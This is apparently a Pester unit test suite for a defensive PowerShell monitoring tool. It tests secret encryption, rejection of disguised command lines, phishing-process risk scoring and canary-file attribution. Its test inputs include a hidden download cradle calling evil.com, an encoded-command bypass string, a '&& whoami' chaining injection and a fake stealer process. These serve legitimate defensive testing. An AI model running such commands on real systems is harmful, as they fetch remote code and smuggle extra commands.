# =====================================================================
# Security Sentinel Ultra v8.0 - Pester Unit Test Suite
# Tests: DPAPI, Anti-Bypass, Phishing Macro Anomaly, Zero-Trust Safe-Mode, Canary
# =====================================================================

$ScriptRoot = Split-Path -Parent $PSScriptRoot
$WatchdogScript = Join-Path $ScriptRoot "core\SentinelWatchdog.ps1"

Describe "Security Sentinel Ultra v8.0 Enterprise Security Controls" {
    BeforeAll {
        if (-not (Test-Path $WatchdogScript)) {
            throw "SentinelWatchdog.ps1 not found at $WatchdogScript"
        }
        . $WatchdogScript -LibraryOnly
    }

    Context "1. DPAPI Secret Vault Verification" {
        It "Should correctly encrypt and decrypt strings using DPAPI with entropy" {
            $secret = "https://discord.com/api/webhooks/test/sample_enterprise_webhook_url"
            $encrypted = Protect-DpapiString -PlainText $secret
            $encrypted | Should Not BeNullOrEmpty
            $encrypted | Should Not Be $secret

            $decrypted = Unprotect-DpapiString -CipherBase64 $encrypted
            $decrypted | Should Be $secret
        }

        It "Should return empty string when decrypting corrupted ciphertext" {
            $corrupted = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("CorruptedData"))
            $decrypted = Unprotect-DpapiString -CipherBase64 $corrupted
            $decrypted | Should Be ""
        }
    }

    Context "2. Dashboard Exemption Anti-Bypass (Fix for Vulnerability #1)" {
        It "Should strictly reject encoded command payloads attempting to bypass by appending script name" {
            $fakeBypassCmd = "powershell.exe -enc VGVzdFBheWxvYWQ= SentinelDashboard.ps1"
            $isVerified = Test-IsVerifiedSentinelScript -CommandLine $fakeBypassCmd
            $isVerified | Should Be $false
        }

        It "Should strictly reject commands without -File parameter" {
            $noFileCmd = "powershell.exe -ExecutionPolicy Bypass SentinelDashboard.ps1"
            $isVerified = Test-IsVerifiedSentinelScript -CommandLine $noFileCmd
            $isVerified | Should Be $false
        }

        It "Should strictly reject commands containing chaining operators (&&, ;, |)" {
            $chainCmd = "powershell.exe -File `"C:\Safe\SentinelDashboard.ps1`" && whoami"
            $isVerified = Test-IsVerifiedSentinelScript -CommandLine $chainCmd
            $isVerified | Should Be $false
        }

        It "Should strictly reject scripts from unauthorized temp directories" {
            $tempFake = "powershell.exe -File `"C:\Users\Public\SentinelDashboard.ps1`""
            $isVerified = Test-IsVerifiedSentinelScript -CommandLine $tempFake
            $isVerified | Should Be $false
        }
    }

    Context "3. Phishing Parent Process Detection & Macro Anomaly" {
        It "Should assign +50 risk score and CRITICAL alert when spawned by Office/Word macro" {
            $triage = Get-ForensicTriage -ProcessId 0 -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
                                         -CommandLine "powershell.exe -w hidden (New-Object Net.WebClient).DownloadString('http://evil.com')" `
                                         -IsUnsigned $false -IsParentChildAnomaly $true -IsPhishingParent $true

            $triage.RiskScore | Should BeGreaterOrEqual 85
            $triage.Reasons | Should Contain "PhishingParentExploit(+50)"
        }

        It "Should assign +50 risk score when spawned by Acrobat/PDF Reader" {
            $triage = Get-ForensicTriage -ProcessId 0 -FilePath "cmd.exe" `
                                         -CommandLine "cmd.exe /c start calc.exe" `
                                         -IsUnsigned $false -IsParentChildAnomaly $true -IsPhishingParent $true

            $triage.RiskScore | Should BeGreaterOrEqual 85
            $triage.Reasons | Should Contain "PhishingParentExploit(+50)"
        }
    }

    Context "4. Safe-Mode Zero-Trust Name-Spoofing Immunity (Fix for Vulnerability #2)" {
        It "Should reject an unsigned malware binary in Temp named 'node.exe' from getting silent Safe-Mode pass" {
            $fakeNodeTemp = "C:\Users\victim\AppData\Local\Temp\node.exe"
            $triage = Get-ForensicTriage -ProcessId 0 -FilePath $fakeNodeTemp `
                                         -CommandLine "node.exe -e evil()" `
                                         -IsUnsigned $true -IsParentChildAnomaly $false -IsPhishingParent $false

            $triage.RiskScore | Should BeGreaterOrEqual 60
            $triage.Reasons | Should Contain "UnsignedBinary(+25)"
            $triage.Reasons | Should Contain "HighRiskPath(+20)"
        }
    }

    Context "5. Stop Token Security & CSPRNG Binding (Fix for Vulnerability #3)" {
        It "Should reject stop token generated for a different PID" {
            $valid = Test-AuthenticatedStopToken -ExpectedWatchdogPid "99999"
            $valid | Should Be $false
        }
    }

    Context "6. Canary Decoy Integrity & Attribution" {
        It "Should correctly attribute SACL Event 4663 XML to target process" {
            $sampleXml = @"
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <EventData>
    <Data Name="SubjectUserName">TestUser</Data>
    <Data Name="ObjectName">C:\Users\victim\AppData\Roaming\SecuritySentinel_Canary\crypto_wallet_vault_seed.txt</Data>
    <Data Name="ProcessId">0x1404</Data>
    <Data Name="ProcessName">C:\Users\victim\Downloads\stealer.exe</Data>
  </EventData>
</Event>
"@
            $parsed = Parse-Event4663Xml -EventXmlString $sampleXml
            $parsed.ProcessId | Should Be 5124
            $parsed.ProcessName | Should Be "C:\Users\victim\Downloads\stealer.exe"
            $parsed.ObjectName | Should Match "SecuritySentinel_Canary"
        }
    }
}

# SIG # Begin signature block
# MIIF0QYJKoZIhvcNAQcCoIIFwjCCBb4CAQExDzANBglghkgBZQMEAgEFADB5Bgor
# BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG
# KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCAXlS384MIRQy0r
# xm2AHteRS1InfOu+bo3FMYJcR7EfC6CCAzIwggMuMIICFqADAgECAhARiv7ch4Yq
# k00USv2WB3cfMA0GCSqGSIb3DQEBCwUAMC8xLTArBgNVBAMMJFNlY3VyaXR5IFNl
# bnRpbmVsIFVsdHJhIENvZGUgU2lnbmluZzAeFw0yNjExMDkwMjUxMjZaFw0zMTEx
# MDkwMzAxMjVaMC8xLTArBgNVBAMMJFNlY3VyaXR5IFNlbnRpbmVsIFVsdHJhIENv
# ZGUgU2lnbmluZzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALllSiqT
# Y5Sc6hifAl+AGeEpL3joSXd9ne4K7pKYDHPQavPfBy32CzCJa1jyX77QoO1UtsOv
# On5Xoi8k5ApurF/WYtjU0g3ql946XPjn6VjwGLmbqSA+pNGqnOMjBz4ox0cqVblm
# 5hD944XKqtREmR7apy3lthUp7XTTG7BGRAVqhZpd+E/VTVG0A+P3wcNc7y3aOxoa
# DJ6JHO/8putrt37Q54x3UVUXOU8Zbwwjic/NI7WV5ckmQ00jiI2cxZgzXdqnXxDU
# aWxd7Ek2/z9QDJEE6wRtBHtvynUpAcZvBW87Xx0WwB8h5qh2P1gHF5ZONY1hzuav
# shNwuowu2k17JakCAwEAAaNGMEQwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQMMAoG
# CCsGAQUFBwMDMB0GA1UdDgQWBBThzeAg8TkOvzIAhDScXw7avedctTANBgkqhkiG
# 9w0BAQsFAAOCAQEAQJM2S9UXri6Zk2rCN6vcsOSuJBRdo43f2i/IXF8KqqPl89cB
# 0EKkiYCaz/1zpjyqotuM0PfHdQgyhOS1rBy8BGCc9CmD2Yk4mcGe1cq/DPrjjmHZ
# I/Hbwq5jla1t5hIB8TENaRlO2yJcnx0m7zJ90RHkCm5t4sVQO55kh//OfQ4RUXEA
# vNdnlgF1EkHey5FbUxyhcEsCZpsJU+KrGceLE43oYtCEekpdTsNuC3SNCYP674yo
# lebxXnckHIuqfnYmizmxBMhYcK3RChIIv8cFPR2/n0EhcQ3XeNNfksfrVyarz8eE
# BFVfGerioUtLIH4OFiCsGTtRr0BCbo6iE7kwajGCAfUwggHxAgEBMEMwLzEtMCsG
# A1UEAwwkU2VjdXJpdHkgU2VudGluZWwgVWx0cmEgQ29kZSBTaWduaW5nAhARiv7c
# h4Yqk00USv2WB3cfMA0GCWCGSAFlAwQCAQUAoIGEMBgGCisGAQQBgjcCAQwxCjAI
# oAKAAKECgAAwGQYJKoZIhvcNAQkDMQwGCisGAQQBgjcCAQQwHAYKKwYBBAGCNwIB
# CzEOMAwGCisGAQQBgjcCARUwLwYJKoZIhvcNAQkEMSIEIJXMiCTwXWR8i424TOD7
# vmBOmAR0FFHvwUT72MEVT9IUMA0GCSqGSIb3DQEBAQUABIIBAFv8cOPFcOrwfCtZ
# 15UewFCzuyZjuibPVrM4jTnPKkj5qnsECElJ2FoNxG4SFJRjWadcr7mAI1mw+ij+
# 1PEf+NFAQ3gGqMV9u0EzGAjbeQjelbjx4j+iCpS+AbUhkZCB0du1nyc97Y68lKpV
# swA9QJSW0o8DkAo3tC91bJjh8q3ly07KzmY9ynIky0oHIpAB3Ue0CVGKEF/Aj74q
# sM2bHoXTZbEY8gJV1etrdMS4T1mwEH6GlmVKaN2VRYOPY6jDN5PY7MOKkTsC5Bn7
# 9vTi4Zoyd5TUKDrJEHsInCDNES2wVX3XTMNDjjLe/1lHiL/XJFlSVsG50RfIJ5Tc
# MOG0CiA=
# SIG # End signature block
